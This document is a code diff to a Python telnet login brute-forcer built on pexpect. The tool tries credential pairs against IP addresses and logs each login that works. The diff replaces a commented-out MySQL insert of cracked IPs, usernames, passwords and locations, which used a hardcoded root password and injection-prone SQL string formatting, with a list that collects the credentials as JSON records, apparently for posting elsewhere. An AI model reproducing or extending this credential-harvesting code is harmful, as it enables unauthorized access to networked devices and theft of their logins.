@@ -2,7 +2,9 @@
 #encoding:utf-8
 
 import pexpect
+import json
 verify_timeout = 3
+post_json_list = []
 class Connection:
     def __init__(self,ip,auth_queue):
         self.new_state(conn_state)
@@ -54,7 +56,8 @@ class user_state:
         #print ("user_state %s:%s-%s:index=%s" % (conn.ip,conn.auth[0],conn.auth[1],index))
         if index == 0:
             print ("Got password %s:%s-%s" % (conn.ip,conn.auth[0],""))
-            conn.new_state(confirm_state)
+            post_json_list_add(conn.ip,conn.auth[0],"")
+            conn.new_state(None)
         elif index == 1:
             conn.new_state(passwd_state)
         elif index < 6:
@@ -75,27 +78,16 @@ class passwd_state:
         print ("passwd_state %s:%s-%s:index=%s" % (conn.ip,conn.auth[0],conn.auth[1],index))        
         if index <= 1:
             print ("Got password %s:%s-%s" % (conn.ip,conn.auth[0],conn.auth[1]))
-            conn.new_state(confirm_state)
+            post_json_list_add(conn.ip,conn.auth[0],conn.auth[1])
+            conn.new_state(None)
         elif index < 5:
             conn.new_state(user_state)
         else:
             conn.new_state(conn_state)
 
-class confirm_state:
-    @staticmethod
-    def _run(conn):
-        print ("confirm_state")
-        #try:
-        #    user,passwd = conn.auth
-        #    if conn.auth == ("user","password"):
-        #        conn.new_state(None)
-        #        return
-        #    db = MySQLdb.connect("localhost","root","111111","telnet_data",charset="utf8")
-        #    cursor = db.cursor()
-        #    cursor.execute("INSERT INTO auth_table(ip,port,username,password,loc) values('%s','%d','%s','%s','%s')" % (conn.ip,23,user,passwd,IP.find(conn.ip)))
-        #    db.commit()
-        #    print ("[report] One result import to database")
-        #except:
-        #    db.rollback()
-        conn.new_state(None)
-        #db.close()
+def post_json_list_add(ip,user,auth):
+    post_str = {}
+    post_str["ip"] = ip
+    post_str["user"] = user
+    post_str["auth"] = auth
+    post_json_list.append(post_str)
